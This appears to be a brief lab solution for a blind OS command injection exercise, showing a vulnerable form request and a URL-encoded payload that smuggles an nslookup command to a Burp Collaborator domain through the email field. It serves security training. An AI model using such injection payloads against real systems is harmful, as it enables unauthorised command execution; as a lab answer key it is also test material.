
# Solution

**The vuln param**
```
&email=fow%40email.com&subject=OOB&message=The+app+executes+a+shell+command
```

Solution:
The injectable param is the email field.
Use the `nslookup` cmd agains the burp collaborator addy.
And be sure to URL encode it

<br>

**The exploit**
```
%3b+nslookup+collboratoraddy.oastify.com%3b
```
